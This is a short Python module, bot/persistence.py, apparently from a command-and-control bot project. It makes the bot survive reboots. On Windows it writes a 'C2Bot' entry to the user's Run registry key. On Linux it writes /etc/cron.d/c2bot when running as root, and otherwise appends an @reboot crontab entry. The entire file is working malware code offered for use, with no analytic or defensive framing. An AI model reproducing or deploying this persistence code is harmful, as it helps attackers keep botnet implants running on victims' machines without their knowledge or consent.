# bot/persistence.py
import os
import platform
import logging
import subprocess

def add_persistence():
    try:
        if platform.system() == "Windows":
            import winreg
            key = winreg.HKEY_CURRENT_USER
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(key, key_path, 0, winreg.KEY_SET_VALUE) as regkey:
                winreg.SetValueEx(regkey, "C2Bot", 0, winreg.REG_SZ, os.path.abspath(__file__))
        elif platform.system() == "Linux":
            script_path = os.path.abspath(__file__)
            cron_job = f"@reboot {script_path}\n"
            # Try to use systemd if possible (placeholder), else use crontab
            if os.geteuid() == 0:
                with open("/etc/cron.d/c2bot", "w") as f:
                    f.write(cron_job)
            else:
                subprocess.run(f"(crontab -l; echo '@reboot {script_path}') | crontab -", shell=True, check=True)
    except Exception as e:
        logging.error(f"Error adding persistence: {e}")
